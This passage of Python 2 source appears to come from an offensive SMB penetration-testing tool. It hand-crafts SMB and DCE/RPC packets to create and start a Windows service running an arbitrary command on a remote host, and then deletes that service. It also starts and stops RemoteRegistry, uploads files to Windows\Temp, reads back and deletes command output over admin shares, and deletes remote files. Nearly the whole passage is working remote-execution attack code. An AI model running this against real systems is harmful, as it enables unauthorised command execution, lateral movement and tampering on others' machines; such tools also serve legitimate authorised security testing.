        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to stop the service.\n")
            return ModifySMBRetCode(data)
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLDeleteService(ContextHandle=ContextHandlerService)
        x = SMBDCEPacketData(Opnum="\x02\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLCloseService
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to delete the service.\n")
            return ModifySMBRetCode(data)
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLCloseService(ContextHandle=ContextHandlerService)
        x = SMBDCEPacketData(Opnum="\x00\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        return data, s, f 


###########################
#Launch And Create Service
###########################
def CreateService(Command, ServiceNameChars, ServiceIDChars, f, host, data, s):
    ## DCE/RPC SVCCTLOpenManagerW.
    if data[8:10] == "\x2e\x00":
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLOpenManagerW(MachineNameRefID="\x00\x00\x02\x00", MachineName=host)
        w.calculate()
        x = SMBDCEPacketData(Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
    ##Error handling.
    if data[8:10] == "\x2e\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to open SVCCTL Service Manager, is that user a local admin on this host?\n")
            return ModifySMBRetCode(data)

    ## DCE/RPC Create Service.
    if data[8:10] == "\x25\x00":
        ContextHandler = data[84:104]
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x09\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLCreateService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars,DisplayNameID=ServiceIDChars,BinCMD=Command)
        w.calculate()
        x = SMBDCEPacketData(Opnum="\x0c\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        #print ("[+] Creating service")

    ## DCE/RPC SVCCTLOpenService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to create the service\n")
            return ModifySMBRetCode(data)
        ContextHandlerService = data[88:108]
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLOpenService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars)
        w.calculate()
        x = SMBDCEPacketData(Opnum="\x10\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLStartService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to open the service.\n")
            return ModifySMBRetCode(data)
        ContextHandler = data[84:104]
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLStartService(ContextHandle=ContextHandler)
        x = SMBDCEPacketData(Opnum="\x13\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLQueryService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to start the service.\n")
            return ModifySMBRetCode(data)
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLQueryService(ContextHandle=ContextHandlerService)
        x = SMBDCEPacketData(Opnum="\x06\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        s.send(buffer1)
        data = s.recv(2048)
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLControlService, stop operation.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to query the service.\n")
            return ModifySMBRetCode(data)
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLControlService(ContextHandle=ContextHandlerService,ControlOperation = "\x01\x00\x00\x00")
        x = SMBDCEPacketData(Opnum="\x01\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLDeleteService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to start the service.\n")
            return ModifySMBRetCode(data)
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLDeleteService(ContextHandle=ContextHandlerService)
        x = SMBDCEPacketData(Opnum="\x02\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLCloseService
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to delete the service.\n")
            return ModifySMBRetCode(data)
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLCloseService(ContextHandle=ContextHandlerService)
        x = SMBDCEPacketData(Opnum="\x00\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        return data, s, f 


###########################
#Start Winreg Service
###########################
def StartWinregService(f, host, data, s):
    ## DCE/RPC SVCCTLOpenManagerW.
    if data[8:10] == "\x2e\x00":
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLOpenManagerW(MachineNameRefID="\x00\x00\x02\x00", MachineName=host)
        w.calculate()
        x = SMBDCEPacketData(Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
    ##Error handling.
    if data[8:10] == "\x2e\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to open SVCCTL Service Manager, is that user a local admin on this host?\n")
            return ModifySMBRetCode(data)

    ## DCE/RPC SVCCTLOpenService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to create the service\n")
            return ModifySMBRetCode(data)
        #print ("[+] Service name: %s with display name: %s successfully created"%(ServiceNameChars, ServiceIDChars))
        #ContextHandlerService = data[88:108]
        ContextHandler = data[84:104]
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLOpenService(ContextHandle=ContextHandler,ServiceName="RemoteRegistry")
        w.calculate()
        x = SMBDCEPacketData(Opnum="\x10\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

        ## DCE/RPC SVCCTLStartService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to open the service.\n")
            return ModifySMBRetCode(data)
        ContextHandlerService = data[84:104]
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLStartService(ContextHandle=ContextHandlerService)
        x = SMBDCEPacketData(Opnum="\x13\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLQueryService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to start the service.\n")
            return ModifySMBRetCode(data)
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLQueryService(ContextHandle=ContextHandlerService)
        x = SMBDCEPacketData(Opnum="\x06\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLCloseService
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to query the service.\n")
            return ModifySMBRetCode(data)
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLCloseService(ContextHandle=ContextHandlerService)
        x = SMBDCEPacketData(Opnum="\x00\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        return data, s, f 

###########################
#Stop Winreg Service
###########################
def StopWinregService(f, host, data, s):
    ## DCE/RPC SVCCTLOpenManagerW.
    if data[8:10] == "\x2e\x00":
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLOpenManagerW(MachineNameRefID="\x00\x00\x02\x00", MachineName=host)
        w.calculate()
        x = SMBDCEPacketData(Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
    ##Error handling.
    if data[8:10] == "\x2e\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to open SVCCTL Service Manager, is that user a local admin on this host?\n")
            return ModifySMBRetCode(data)

    ## DCE/RPC SVCCTLOpenService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to create the service\n")
            return ModifySMBRetCode(data)
        #print ("[+] Service name: %s with display name: %s successfully created"%(ServiceNameChars, ServiceIDChars))
        #ContextHandlerService = data[88:108]
        ContextHandler = data[84:104]
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLOpenService(ContextHandle=ContextHandler,ServiceName="RemoteRegistry")
        w.calculate()
        x = SMBDCEPacketData(Opnum="\x10\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

        ## DCE/RPC SVCCTLStartService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to open the service.\n")
            return ModifySMBRetCode(data)
        ContextHandlerService = data[84:104]
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLControlService(ContextHandle=ContextHandlerService)
        x = SMBDCEPacketData(Opnum="\x01\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLQueryService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to stop the service.\n")
            return ModifySMBRetCode(data)
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLQueryService(ContextHandle=ContextHandlerService)
        x = SMBDCEPacketData(Opnum="\x06\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLCloseService
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to query the service.\n")
            return ModifySMBRetCode(data)
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLCloseService(ContextHandle=ContextHandlerService)
        x = SMBDCEPacketData(Opnum="\x00\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        return data, s, f 


###########################
#Close a FID
###########################

def CloseFID(f, data, s):
    ##Close FID Request
    if data[8:10] == "\x25\x00":
        head = SMBHeader(cmd="\x04",flag1="\x18", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
        t = CloseRequest(FID = f)
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
        s.send(buffer1)
        data = s.recv(2048)
        return data, s

def SMBDCERPCCloseFID(f, data, s):
    ##Close FID Request
    if data[8:10] == "\x2e\x00":
        head = SMBHeader(cmd="\x04",flag1="\x18", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
        t = CloseRequest(FID = f)
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
        s.send(buffer1)
        data = s.recv(2048)
        return data, s

###########################
#Open a file for reading
###########################

def SMBOpenFile(Filename, Share, Host, Access, data, s):
    ##Start with a Tree connect on C$
    head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x10\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
    t = SMBTreeConnectData(Path="\\\\"+Host+"\\"+Share+"$")
    t.calculate()
    packet1 = str(head)+str(t)
    buffer1 = longueur(packet1)+packet1
    s.send(buffer1)
    data = s.recv(2048)

    ##OpenAndX.
    if data[8:10] == "\x75\x00":
        head = SMBHeader(cmd="\x2d",flag1="\x10", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
        t = OpenAndX(File=Filename, OpenFunc="\x01\x00", Flags="\x07\x00", DesiredAccess=Access)
        t.calculate()
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
        s.send(buffer1)
        data = s.recv(2048)

    if data[8:10] == "\x2d\x22":
        print ("[+] Can't open the file, access is denied (write protected file?).")
        f = "A" #Don't throw an exception at the calling function because there's not enough value to unpack.
        #We'll recover that connection..
        return data, s, f

    if data[8:10] == "\x2d\x43":
        time.sleep(1)
        head = SMBHeader(cmd="\x2d",flag1="\x10", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
        t = OpenAndX(File=Filename, OpenFunc="\x01\x00",DesiredAccess=Access)
        t.calculate()
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1
        s.send(buffer1)
        data = s.recv(2048)

    if data[8:10] == "\x2d\x00":##Found all good.
        f = data[41:43]
        return data, s, f

    if data[8:10] == "\x2d\x34":#not found
        time.sleep(2)#maybe still processing the cmd. Be patient, then grab it again.
        head = SMBHeader(cmd="\x2d",flag1="\x10", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
        t = OpenAndX(File=Filename, OpenFunc="\x01\x00")
        t.calculate()
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
        s.send(buffer1)
        data = s.recv(2048)

        ##OpenAndX.
        if data[8:10] == "\x2d\x34":
            print ("[+] The command failed or took to long to complete.")
            return data, s

        ##all good.
        if data[8:10] == "\x2d\x00":
             f = data[41:43]
             return data, s, f

###########################
#Open a file for writing
###########################

def SMBOpenFileForWriting(Filename, FileSize, FileContent, Share, Host, Access, data, s):
    ##Start with a Tree connect on C$
    head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x10\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
    t = SMBTreeConnectData(Path="\\\\"+Host+"\\"+Share+"$")
    t.calculate()
    packet1 = str(head)+str(t)
    buffer1 = longueur(packet1)+packet1
    s.send(buffer1)
    data = s.recv(2048)

    ##NtCreate.
    if data[8:10] == "\x75\x00":
        head = SMBHeader(cmd="\xa2",flag1="\x18", flag2="\x02\x28",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
        t = SMBNTCreateData(FileName="Windows\\Temp\\"+Filename, CreateFlags="\x00\x00\x00\x00", AccessMask="\x96\x01\x03\x00",FileAttrib="\x20\x00\x00\x00", ShareAccess="\x00\x00\x00\x00", Disposition = "\x02\x00\x00\x00", CreateOptions="\x44\x00\x00\x00")
        t.calculate()
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
        s.send(buffer1)
        data = s.recv(2048)

    if data[8:10] == "\xa2\x22":
        print ("[+] Can't open the file, access is denied (write protected file?).")
        f = "A" #Don't throw an exception at the calling function because there's not enough value to unpack.
        #We'll recover that connection..
        return data, s, f

    if data[8:10] == "\xa2\x35":
        print ("[+] Name collision, this file already exist in windows/temp/. Try: delete /windows/Temp/"+Filename)
        f = "A" #Don't throw an exception at the calling function because there's not enough value to unpack.
        #We'll recover that connection..
        return data, s, f

    if data[8:10] == "\xa2\x00":##Found, all good.
        f = data[42:44]
        return data, s, f

        ##OpenAndX.
        if data[8:10] == "\xa2\x34":
            print ("[+] The command failed or took to long to complete.")
            return data, s

        ##all good.
        if data[8:10] == "\xa2\x00":
             f = data[41:43]
             return data, s, f
###########################
#Open an IPC$ channel.
###########################

def SMBOpenPipe(Host, data, s):
    ##Start with a Tree connect on IPC$
    head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x10\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
    t = SMBTreeConnectData(Path="\\\\"+Host+"\\IPC$")
    t.calculate()
    packet1 = str(head)+str(t)
    buffer1 = longueur(packet1)+packet1
    s.send(buffer1)
    data = s.recv(2048)
    return data, s

###########################
#Close a TID
###########################

def CloseTID(data, s):
    ##Start with a Tree connect on IPC$
    head = SMBHeader(cmd="\x71",flag1="\x18", flag2="\x07\xc8",mid="\x10\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
    t = SMBTreeDisconnect()
    packet1 = str(head)+str(t)
    buffer1 = longueur(packet1)+packet1
    s.send(buffer1)
    data = s.recv(2048)
    return data, s

###########################
#Read then delete it.
###########################
def GrabAndRead(f, Filename, data, s):
    ##ReadRequest.
    if data[8:10] == "\x2d\x00":
       ##grab the filesize from the OpenAndX response.
       filesize = struct.unpack("<i", data[49:53])[0]
       head = SMBHeader(cmd="\x2e",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x12\x00")
       t = ReadRequestAndX(FID=f)
       packet1 = str(head)+str(t)
       buffer1 = longueur(packet1)+packet1  
       s.send(buffer1)
       start_time = time.time()
       s, data = SMBReadRecv(s)
       ##Get output from smbread.
       Output = ExtractCommandOutput(data)

       ##Do large reads..
       if data[8:10] == "\x2e\x00" and struct.unpack("<H", data[61:63])[0] == 65520:
          print ('File size: %s'%(GetReadableSize(filesize)))
          #Do progress bar for large download, so the pentester doesn't fall asleep while doing a large SMB read operation..
          #if we're here it's because filesize > 65520.
          first = filesize-65520
          if first <= 65520:
             count_number = 1
          else:
             count_number = int(first/65520)+1
          count = 0 
          dataoffset = 0
          bar = 80
          for i in xrange(count_number):
              count = count+1
              alreadydone = int(round(80 * count / float(count_number)))
              pourcent = round(100.0 * count / float(count_number), 1)
              progress = '=' * alreadydone + '-' * (80 - alreadydone)
              sys.stdout.write('[%s] %s%s\r' % (progress, pourcent, '%'))
              sys.stdout.flush() 
              dataoffset = dataoffset + 65520
              data, s, out = ReadOutput(struct.pack("<i", dataoffset), f, data, s)
              Output += out
          sys.stdout.write('\n')
          sys.stdout.flush()
          Seconds = (time.time() - start_time) - READTIMEOUT
          if Seconds>60:
              minutes = Seconds/60
              print ('Downloaded in: %.3g minutes.'%(minutes))
          if Seconds<60:
              print ('Downloaded in: %.3g seconds'%(Seconds))

    ##Close Request
    if data[8:10] == "\x2e\x00":
        head = SMBHeader(cmd="\x04",flag1="\x18", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
        t = CloseRequest(FID = f)
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
        s.send(buffer1)
        data = s.recv(2048)
        return data, s, Output

###########################
#Write it.
###########################
def UploadAndWrite(f, FileSize, FileContent, data, s):
    ##WriteRequest for a small file.
    if data[8:10] == "\xa2\x00" and FileSize <= 29999:
       head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x12\x00")
       t = SMBWriteData(FID=f, Data=FileContent)
       t.calculate()
       packet1 = str(head)+str(t)
       buffer1 = longueur(packet1)+packet1  
       s.send(buffer1)
       data = s.recv(2048)
    ##WriteRequest for a big file.
    if data[8:10] == "\xa2\x00" and FileSize >= 30000: 
       ##How many requests?
       count_number = int(FileSize/30000)+1
       #Do progress bar for large uploads, so the pentester doesn't fall asleep while doing a large SMB write operations..
       dataoffset = 0
       count = 0
       bar = 80
       start_time = time.time()
       print ('File size: %s'%(GetReadableSize(FileSize)))
       for i in xrange(count_number):
              count = count+1
              Chunk = FileContent[dataoffset:dataoffset+30000]
              alreadydone = int(round(80 * count / float(count_number)))
              pourcent = round(100.0 * count / float(count_number), 1)
              progress = '=' * alreadydone + '-' * (80 - alreadydone)
              sys.stdout.write('[%s] %s%s\r' % (progress, pourcent, '%'))
              sys.stdout.flush() 

              if len(Chunk) == 0:
                 pass
              else:
                 data, s = WriteOutput(struct.pack("<I",dataoffset), Chunk, data, f, s)
                 dataoffset = dataoffset + 30000
       sys.stdout.write('\n')
       sys.stdout.flush()
       Seconds = (time.time() - start_time) - READTIMEOUT
       if Seconds>60:
              minutes = Seconds/60
              print ('Uploaded in: %.3g minutes.'%(minutes))
       if Seconds<60:
              print ('Uploaded in: %.3g seconds'%(Seconds))

    ##Close Request
    if data[8:10] == "\x2f\x00":
        head = SMBHeader(cmd="\x04",flag1="\x18", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
        t = CloseRequest(FID = f)
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
        s.send(buffer1)
        data = s.recv(2048)
        return data, s

###########################
#Read then delete it.
###########################
def ReadAndDelete(f, Filename, data, s):
    ##ReadRequest.
    if data[8:10] == "\x2d\x00":
       filesize = struct.unpack("<i", data[49:53])[0]
       head = SMBHeader(cmd="\x2e",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x12\x00")
       t = ReadRequestAndX(FID=f)
       packet1 = str(head)+str(t)
       buffer1 = longueur(packet1)+packet1  
       s.send(buffer1)
       start_time = time.time()
       s, data = SMBReadRecv(s)
       ##Get output from smbread.
       Output = ExtractCommandOutput(data)

       ##Do large reads..
       if data[8:10] == "\x2e\x00" and struct.unpack("<H", data[61:63])[0] == 65520:
          print ('File size: %s'%(GetReadableSize(filesize)))
          #Do progress bar for large download, so the pentester doesn't fall asleep while doing a large SMB read operation..
          #if we're here it's because filesize > 65520.
          first = filesize-65520
          if first <= 65520:
             count_number = 1
          else:
             count_number = int(first/65520)+1
          count = 0 
          dataoffset = 0
          bar = 80
          for i in xrange(count_number):
              count = count+1
              alreadydone = int(round(80 * count / float(count_number)))
              pourcent = round(100.0 * count / float(count_number), 1)
              progress = '=' * alreadydone + '-' * (80 - alreadydone)
              sys.stdout.write('[%s] %s%s\r' % (progress, pourcent, '%'))
              sys.stdout.flush() 
              dataoffset = dataoffset + 65520
              data, s, out = ReadOutput(struct.pack("<i", dataoffset), f, data, s)
              Output += out
          sys.stdout.write('\n')
          sys.stdout.flush()
          Seconds = (time.time() - start_time) - READTIMEOUT
          if Seconds>60:
              minutes = Seconds/60
              print ('Downloaded in: %.3g minutes.\n'%(minutes))
          if Seconds<60:
              print ('Downloaded in: %.3g seconds'%(Seconds))

    ##Close Request
    if data[8:10] == "\x2e\x00":
        head = SMBHeader(cmd="\x04",flag1="\x18", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
        t = CloseRequest(FID = f)
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
        s.send(buffer1)
        data = s.recv(2048)

    ##DeleteFileRequest.
    if data[8:10] == "\x04\x00":
       head = SMBHeader(cmd="\x06",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x13\x00")
       t = DeleteFileRequest(File=Filename)
       t.calculate()
       packet1 = str(head)+str(t)
       buffer1 = longueur(packet1)+packet1  
       s.send(buffer1)
       data = s.recv(2048)

    if data[8:10] == "\x06\x00":
       head = SMBHeader(cmd="\x2d",flag1="\x10", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
       t = OpenAndX(File=Filename, OpenFunc="\x01\x00")
       t.calculate()
       packet1 = str(head)+str(t)
       buffer1 = longueur(packet1)+packet1  
       s.send(buffer1)
       data = s.recv(2048)
       return data, s, Output

def DeleteAFile(Filename, data, s, Host):
    ##Start with a Tree connect on C$
    head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x10\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
    t = SMBTreeConnectData(Path="\\\\"+Host+"\\C$")
    t.calculate()
    packet1 = str(head)+str(t)
    buffer1 = longueur(packet1)+packet1
    s.send(buffer1)
    data = s.recv(2048)

    ##DeleteFileRequest.
    if data[8:10] == "\x75\x00":
       head = SMBHeader(cmd="\x06",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x13\x00")
       t = DeleteFileRequest(File=Filename)
       t.calculate()
       packet1 = str(head)+str(t)
       buffer1 = longueur(packet1)+packet1  
       s.send(buffer1)
       data = s.recv(2048)

    if data[8:10] == "\x06\x21":
       time.sleep(1)
       head = SMBHeader(cmd="\x06",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x13\x00")
       t = DeleteFileRequest(File=Filename)
       t.calculate()
       packet1 = str(head)+str(t)
       buffer1 = longueur(packet1)+packet1  
       s.send(buffer1)
       data = s.recv(2048)

    if data[8:10] == "\x06\x21":
       print ("[+] Delete Failed. Server ("+Host+") returned STATUS_CANNOT_DELETE, "+Filename+" is currently in use by another process.")
       print ("[+] Try taskkill /F /IM process_name, then delete the file.")
       return data, s

    if data[8:10] == "\x06\x34":
       print ("[+] Delete Failed. File not found.")
       return data, s

    if data[8:10] == "\x06\x00":
       head = SMBHeader(cmd="\x2d",flag1="\x10", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
       t = OpenAndX(File=Filename, OpenFunc="\x01\x00")
       t.calculate()
       packet1 = str(head)+str(t)
       buffer1 = longueur(packet1)+packet1  
       s.send(buffer1)
       data = s.recv(2048)
       return data, s

def GrabKeyValue(s, f, handler, data, keypath):
    ## DCE/RPC OpenKey.
    if data[8:10] == "\x25\x00":
        ContextHandler = handler
